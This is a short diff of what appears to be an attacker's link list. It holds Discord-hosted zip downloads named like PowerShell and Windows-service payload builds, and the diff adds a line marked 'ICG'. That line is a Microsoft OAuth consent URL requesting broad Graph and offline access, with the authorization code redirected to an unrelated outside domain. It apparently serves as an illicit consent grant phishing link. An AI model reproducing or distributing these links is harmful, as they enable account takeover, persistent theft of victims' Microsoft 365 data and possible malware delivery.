@@ -7,3 +7,6 @@ https://cdn.discordapp.com/attachments/366636579164258304/1485620514549534870/Ma
 https://cdn.discordapp.com/attachments/366636579164258304/1485620668467904513/Main_x64_ps1.zip?ex=69c28790&is=69c13610&hm=330afab7a81da3abdee2b428dcf99c46751793ef9480c1c618606749e04b2fc4&
  
 https://cdn.discordapp.com/attachments/366636579164258304/1485620846587416727/Main_x64_svc.zip?ex=69c287bb&is=69c1363b&hm=70e28b60139bb0b1b7602d4ba86a2221038c77f40c1abdefb60d7e21fd50ccb3&
+
+
+ICG: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=24a9f814-ca34-4aa0-8336-cb5e9be0d995&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2Fzgjatj.com%2Flogin%2Fauthorize&response_mode=query
